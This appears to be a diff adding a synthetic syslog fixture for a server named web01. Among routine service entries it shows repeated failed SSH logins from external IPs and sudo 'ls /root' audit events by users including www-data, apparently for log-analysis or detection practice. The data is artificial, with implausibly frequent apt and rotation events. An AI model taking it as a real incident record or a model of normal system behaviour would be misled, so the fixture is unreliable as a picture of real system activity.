+Aug 20 02:49:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:49:13 web01 audit[456]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:49:16 web01 sshd[1492]: Failed password for invalid user admin from 45.155.23.87 port 57058 ssh2 event=LOGIN_FAILED
+Aug 20 02:49:22 web01 apt[2546]: Cache clean: removing index files
+Aug 20 02:49:27 web01 apt[3808]: Cache clean: removing index files
+Aug 20 02:49:29 web01 nginx[2586]: 200 0.297 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:49:32 web01 sshd[1176]: Accepted publickey for deploy from 10.0.5.23 port 54467 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:49:34 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:49:39 web01 systemd[1]: Rotate log files.
+Aug 20 02:49:41 web01 systemd[1]: Rotate log files.
+Aug 20 02:49:44 web01 CRON[846]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:49:46 web01 CRON[856]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:49:49 web01 systemd[1]: Rotate log files.
+Aug 20 02:49:51 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:49:52 web01 postfix/smtpd[2488]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:49:56 web01 postfix/smtpd[3121]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:50:01 web01 audit[3524]: user=deploy exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:50:07 web01 NetworkManager[964]: DHCPv4 lease renewed on eth0
+Aug 20 02:50:10 web01 nginx[3092]: 200 0.302 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:50:11 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:50:16 web01 CRON[724]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:50:20 web01 nginx[2953]: 200 0.759 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:50:24 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:50:26 web01 audit[1156]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:50:29 web01 postfix/smtpd[3116]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:50:35 web01 nginx[2928]: 200 0.432 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:50:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:50:40 web01 nginx[2349]: 200 0.572 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:50:43 web01 apt[3737]: Cache clean: removing index files
+Aug 20 02:50:48 web01 CRON[803]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:50:55 web01 NetworkManager[709]: DHCPv4 lease renewed on eth0
+Aug 20 02:50:58 web01 systemd[1]: Rotate log files.
+Aug 20 02:51:05 web01 nginx[2820]: 200 0.572 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:51:10 web01 postfix/smtpd[3035]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:51:12 web01 systemd[1]: Rotate log files.
+Aug 20 02:51:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:51:23 web01 NetworkManager[1041]: DHCPv4 lease renewed on eth0
+Aug 20 02:51:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:51:35 web01 NetworkManager[777]: DHCPv4 lease renewed on eth0
+Aug 20 02:51:41 web01 NetworkManager[1187]: DHCPv4 lease renewed on eth0
+Aug 20 02:51:48 web01 sshd[1266]: Failed password for invalid user user from 185.220.101.17 port 55168 ssh2 event=LOGIN_FAILED
+Aug 20 02:51:53 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:51:55 web01 nginx[2142]: 200 0.515 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:52:00 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:52:03 web01 sshd[1211]: Failed password for invalid user user from 45.155.23.87 port 42966 ssh2 event=LOGIN_FAILED
+Aug 20 02:52:10 web01 CRON[893]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:52:12 web01 NetworkManager[1063]: DHCPv4 lease renewed on eth0
+Aug 20 02:52:17 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:52:19 web01 CRON[776]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:52:24 web01 avahi-daemon[697]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:52:27 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:52:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:52:34 web01 systemd[1]: Rotate log files.
+Aug 20 02:52:41 web01 CRON[715]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:52:44 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:52:45 web01 NetworkManager[967]: DHCPv4 lease renewed on eth0
+Aug 20 02:52:46 web01 audit[227]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:52:48 web01 sshd[1262]: Failed password for invalid user user from 89.248.165.114 port 60487 ssh2 event=LOGIN_FAILED
+Aug 20 02:52:54 web01 postfix/smtpd[2790]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:52:58 web01 systemd[1]: Rotate log files.
+Aug 20 02:53:02 web01 CRON[915]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:53:05 web01 avahi-daemon[428]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:53:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:53:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:53:12 web01 apt[3496]: Cache clean: removing index files
+Aug 20 02:53:18 web01 sshd[1428]: Failed password for invalid user admin from 45.155.23.87 port 44496 ssh2 event=LOGIN_FAILED
+Aug 20 02:53:25 web01 postfix/smtpd[2866]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:53:32 web01 NetworkManager[1035]: DHCPv4 lease renewed on eth0
+Aug 20 02:53:37 web01 CRON[841]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:53:44 web01 sshd[1317]: Failed password for invalid user test from 185.92.220.41 port 46088 ssh2 event=LOGIN_FAILED
+Aug 20 02:53:49 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:53:56 web01 apt[3958]: Cache clean: removing index files
+Aug 20 02:54:01 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:54:02 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:54:08 web01 postfix/smtpd[2994]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:54:12 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:54:14 web01 apt[3578]: Cache clean: removing index files
+Aug 20 02:54:21 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:54:25 web01 sshd[1422]: Accepted publickey for ubuntu from 10.0.4.17 port 57740 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:54:31 web01 NetworkManager[679]: DHCPv4 lease renewed on eth0
+Aug 20 02:54:37 web01 dbus-daemon[1317]: systemd-logind: New session started
+Aug 20 02:54:42 web01 nginx[2703]: 200 0.154 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:54:47 web01 apt[3460]: Cache clean: removing index files
+Aug 20 02:54:51 web01 sshd[1269]: Accepted publickey for deploy from 10.1.0.12 port 62022 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:54:55 web01 nginx[2592]: 200 0.401 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:54:57 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:55:03 web01 avahi-daemon[483]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:55:04 web01 dbus-daemon[1092]: systemd-logind: New session started
+Aug 20 02:55:06 web01 systemd[1]: Rotate log files.
+Aug 20 02:55:13 web01 apt[2555]: Cache clean: removing index files
+Aug 20 02:55:16 web01 sshd[1242]: Failed password for invalid user admin from 185.220.101.17 port 42518 ssh2 event=LOGIN_FAILED
+Aug 20 02:55:19 web01 CRON[770]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:55:26 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:55:31 web01 CRON[868]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:55:35 web01 postfix/smtpd[2579]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:55:38 web01 avahi-daemon[470]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:55:42 web01 CRON[787]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:55:43 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:55:50 web01 sshd[1438]: Failed password for invalid user test from 89.248.165.114 port 47797 ssh2 event=LOGIN_FAILED
+Aug 20 02:55:54 web01 apt[2842]: Cache clean: removing index files
+Aug 20 02:55:56 web01 systemd[1]: Rotate log files.
+Aug 20 02:55:57 web01 dbus-daemon[1273]: systemd-logind: New session started
+Aug 20 02:56:04 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:56:08 web01 postfix/smtpd[2708]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:56:12 web01 apt[4040]: Cache clean: removing index files
+Aug 20 02:56:17 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:56:21 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:56:22 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:56:26 web01 NetworkManager[1142]: DHCPv4 lease renewed on eth0
+Aug 20 02:56:32 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:56:37 web01 dbus-daemon[1479]: systemd-logind: New session started
+Aug 20 02:56:44 web01 sshd[1238]: Failed password for invalid user user from 185.158.106.77 port 50976 ssh2 event=LOGIN_FAILED
+Aug 20 02:56:47 web01 avahi-daemon[480]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:56:53 web01 systemd[1]: Rotate log files.
+Aug 20 02:57:00 web01 NetworkManager[847]: DHCPv4 lease renewed on eth0
+Aug 20 02:57:06 web01 NetworkManager[799]: DHCPv4 lease renewed on eth0
+Aug 20 02:57:11 web01 nginx[2368]: 200 0.806 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:57:14 web01 systemd[1]: Rotate log files.
+Aug 20 02:57:21 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:57:22 web01 sshd[1471]: Accepted publickey for deploy from 10.0.3.11 port 53594 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:57:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:57:26 web01 dbus-daemon[558]: systemd-logind: New session started
+Aug 20 02:57:31 web01 dbus-daemon[1355]: systemd-logind: New session started
+Aug 20 02:57:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:57:39 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:57:46 web01 dbus-daemon[884]: systemd-logind: New session started
+Aug 20 02:57:52 web01 apt[3826]: Cache clean: removing index files
+Aug 20 02:57:57 web01 avahi-daemon[444]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:57:58 web01 NetworkManager[859]: DHCPv4 lease renewed on eth0
+Aug 20 02:58:01 web01 sshd[1493]: Failed password for invalid user admin from 89.248.165.114 port 49056 ssh2 event=LOGIN_FAILED
+Aug 20 02:58:05 web01 NetworkManager[931]: DHCPv4 lease renewed on eth0
+Aug 20 02:58:08 web01 CRON[770]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:58:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:58:18 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:58:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:58:26 web01 sshd[1191]: Failed password for invalid user admin from 185.220.101.17 port 52865 ssh2 event=LOGIN_FAILED
+Aug 20 02:58:32 web01 sshd[1320]: Failed password for invalid user admin from 185.220.101.17 port 65189 ssh2 event=LOGIN_FAILED
+Aug 20 02:58:34 web01 dbus-daemon[608]: systemd-logind: New session started
+Aug 20 02:58:38 web01 NetworkManager[705]: DHCPv4 lease renewed on eth0
+Aug 20 02:58:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:58:46 web01 sshd[1427]: Failed password for invalid user test from 185.92.220.41 port 61393 ssh2 event=LOGIN_FAILED
+Aug 20 02:58:47 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:58:50 web01 CRON[931]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:58:54 web01 systemd[1]: Rotate log files.
+Aug 20 02:58:58 web01 sshd[1215]: Failed password for invalid user user from 45.155.23.87 port 57698 ssh2 event=LOGIN_FAILED
+Aug 20 02:58:59 web01 postfix/smtpd[3105]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:59:06 web01 apt[2748]: Cache clean: removing index files
+Aug 20 02:59:11 web01 sshd[1255]: Accepted publickey for deploy from 10.0.3.11 port 61171 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:59:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:59:18 web01 sshd[1335]: Accepted publickey for deploy from 10.0.5.23 port 63781 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:59:25 web01 apt[3826]: Cache clean: removing index files
+Aug 20 02:59:27 web01 CRON[947]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:59:31 web01 NetworkManager[906]: DHCPv4 lease renewed on eth0
+Aug 20 02:59:37 web01 postfix/smtpd[2509]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:59:43 web01 NetworkManager[1098]: DHCPv4 lease renewed on eth0
+Aug 20 02:59:44 web01 audit[3111]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:59:46 web01 CRON[706]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:59:52 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:59:56 web01 postfix/smtpd[3211]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:00:01 web01 dbus-daemon[1011]: systemd-logind: New session started
+Aug 20 03:00:06 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:00:07 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:00:10 web01 avahi-daemon[371]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:00:14 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:00:20 web01 audit[710]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:00:26 web01 systemd[1]: Rotate log files.
+Aug 20 03:00:27 web01 apt[3501]: Cache clean: removing index files
+Aug 20 03:00:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:00:35 web01 NetworkManager[733]: DHCPv4 lease renewed on eth0
+Aug 20 03:00:36 web01 CRON[931]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:00:39 web01 avahi-daemon[399]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:00:43 web01 dbus-daemon[1355]: systemd-logind: New session started
+Aug 20 03:00:48 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:00:49 web01 sshd[1203]: Failed password for invalid user user from 185.92.220.41 port 42067 ssh2 event=LOGIN_FAILED
+Aug 20 03:00:53 web01 nginx[2823]: 200 0.855 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:00:56 web01 CRON[782]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:01:03 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:01:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:01:13 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:01:15 web01 apt[2844]: Cache clean: removing index files
+Aug 20 03:01:21 web01 postfix/smtpd[2568]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:01:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:01:27 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:01:34 web01 CRON[720]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:01:35 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:01:41 web01 dbus-daemon[1408]: systemd-logind: New session started
+Aug 20 03:01:44 web01 postfix/smtpd[3226]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:01:51 web01 apt[3917]: Cache clean: removing index files
+Aug 20 03:01:53 web01 CRON[833]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:01:57 web01 postfix/smtpd[3360]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:01:59 web01 dbus-daemon[538]: systemd-logind: New session started
+Aug 20 03:02:04 web01 CRON[856]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:02:05 web01 dbus-daemon[1301]: systemd-logind: New session started
+Aug 20 03:02:08 web01 nginx[3142]: 200 0.104 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:02:10 web01 CRON[858]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:02:13 web01 audit[2178]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:02:15 web01 sshd[1127]: Failed password for invalid user user from 185.92.220.41 port 49057 ssh2 event=LOGIN_FAILED
+Aug 20 03:02:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:02:23 web01 audit[2137]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:02:25 web01 CRON[713]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:02:31 web01 postfix/smtpd[2614]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:02:35 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:02:36 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:02:41 web01 CRON[824]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:02:46 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:02:52 web01 sshd[1201]: Failed password for invalid user user from 185.158.106.77 port 53731 ssh2 event=LOGIN_FAILED
+Aug 20 03:02:58 web01 NetworkManager[933]: DHCPv4 lease renewed on eth0
+Aug 20 03:03:00 web01 apt[3167]: Cache clean: removing index files
+Aug 20 03:03:02 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:03:09 web01 CRON[718]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:03:13 web01 systemd[1]: Rotate log files.
+Aug 20 03:03:17 web01 CRON[745]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:03:21 web01 postfix/smtpd[2868]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:03:27 web01 CRON[949]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:03:30 web01 CRON[708]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:03:36 web01 systemd[1]: Rotate log files.
+Aug 20 03:03:38 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:03:42 web01 postfix/smtpd[3178]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:03:45 web01 CRON[854]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:03:47 web01 avahi-daemon[676]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:03:52 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:03:53 web01 postfix/smtpd[2934]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:03:57 web01 audit[2523]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:04:01 web01 avahi-daemon[492]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:04:02 web01 apt[4007]: Cache clean: removing index files
+Aug 20 03:04:09 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:04:13 web01 systemd[1]: Rotate log files.
+Aug 20 03:04:18 web01 audit[281]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:04:19 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:04:23 web01 sshd[1353]: Accepted publickey for deploy from 10.0.5.23 port 57412 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:04:25 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:04:31 web01 apt[2946]: Cache clean: removing index files
+Aug 20 03:04:33 web01 nginx[2185]: 200 0.344 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:04:34 web01 sshd[1335]: Failed password for invalid user test from 185.92.220.41 port 63045 ssh2 event=LOGIN_FAILED
+Aug 20 03:04:41 web01 systemd[1]: Rotate log files.
+Aug 20 03:04:45 web01 sshd[1289]: Failed password for invalid user admin from 89.248.165.114 port 46060 ssh2 event=LOGIN_FAILED
+Aug 20 03:04:51 web01 sshd[1136]: Failed password for invalid user user from 45.155.23.87 port 60555 ssh2 event=LOGIN_FAILED
+Aug 20 03:04:55 web01 audit[2274]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:04:56 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:05:02 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:05:09 web01 NetworkManager[943]: DHCPv4 lease renewed on eth0
+Aug 20 03:05:15 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:05:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:05:20 web01 dbus-daemon[874]: systemd-logind: New session started
+Aug 20 03:05:23 web01 CRON[843]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:05:29 web01 apt[2783]: Cache clean: removing index files
+Aug 20 03:05:32 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:05:38 web01 sshd[1481]: Failed password for invalid user user from 185.92.220.41 port 64679 ssh2 event=LOGIN_FAILED
+Aug 20 03:05:45 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:05:48 web01 sshd[1132]: Accepted publickey for deploy from 10.0.3.11 port 50892 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:05:51 web01 nginx[3026]: 200 0.597 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:05:56 web01 avahi-daemon[590]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:06:02 web01 sshd[1288]: Accepted publickey for deploy from 10.0.5.44 port 60173 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:06:09 web01 NetworkManager[667]: DHCPv4 lease renewed on eth0
+Aug 20 03:06:11 web01 audit[457]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:06:12 web01 postfix/smtpd[2583]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:06:15 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:06:16 web01 CRON[878]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:06:18 web01 sshd[1111]: Failed password for invalid user admin from 185.220.101.17 port 60554 ssh2 event=LOGIN_FAILED
+Aug 20 03:06:21 web01 postfix/smtpd[3098]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:06:26 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:06:29 web01 sshd[1196]: Failed password for invalid user user from 45.155.23.87 port 49552 ssh2 event=LOGIN_FAILED
+Aug 20 03:06:30 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:06:37 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:06:41 web01 systemd[1]: Rotate log files.
+Aug 20 03:06:45 web01 systemd[1]: Rotate log files.
+Aug 20 03:06:49 web01 nginx[2627]: 200 0.235 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:06:51 web01 avahi-daemon[466]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:06:55 web01 postfix/smtpd[2695]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:07:02 web01 audit[1546]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:07:05 web01 sshd[1464]: Failed password for invalid user admin from 185.220.101.17 port 45268 ssh2 event=LOGIN_FAILED
+Aug 20 03:07:10 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:07:17 web01 NetworkManager[757]: DHCPv4 lease renewed on eth0
+Aug 20 03:07:19 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:07:22 web01 systemd[1]: Rotate log files.
+Aug 20 03:07:25 web01 postfix/smtpd[2610]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:07:30 web01 NetworkManager[924]: DHCPv4 lease renewed on eth0
+Aug 20 03:07:33 web01 CRON[838]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:07:35 web01 sshd[1355]: Accepted publickey for ubuntu from 10.0.5.23 port 56628 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:07:42 web01 CRON[937]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:07:45 web01 CRON[865]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:07:51 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:07:58 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:08:05 web01 systemd[1]: Rotate log files.
+Aug 20 03:08:08 web01 NetworkManager[1090]: DHCPv4 lease renewed on eth0
+Aug 20 03:08:09 web01 CRON[778]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:08:10 web01 postfix/smtpd[3261]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:08:12 web01 sshd[1411]: Failed password for invalid user admin from 185.158.106.77 port 41803 ssh2 event=LOGIN_FAILED
+Aug 20 03:08:18 web01 CRON[900]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:08:25 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:08:26 web01 sshd[1301]: Accepted publickey for deploy from 10.0.5.23 port 58385 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:08:28 web01 sshd[1128]: Failed password for invalid user user from 185.220.101.17 port 56762 ssh2 event=LOGIN_FAILED
+Aug 20 03:08:34 web01 postfix/smtpd[2551]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:08:40 web01 audit[1681]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:08:43 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:08:46 web01 nginx[3148]: 200 0.556 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:08:47 web01 CRON[889]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:08:51 web01 avahi-daemon[497]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:08:53 web01 avahi-daemon[567]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:08:59 web01 audit[3522]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:09:04 web01 systemd[1]: Rotate log files.
+Aug 20 03:09:06 web01 nginx[2686]: 200 0.637 - GET / HTTP/1.1 "-" "Mozilla/5.0"
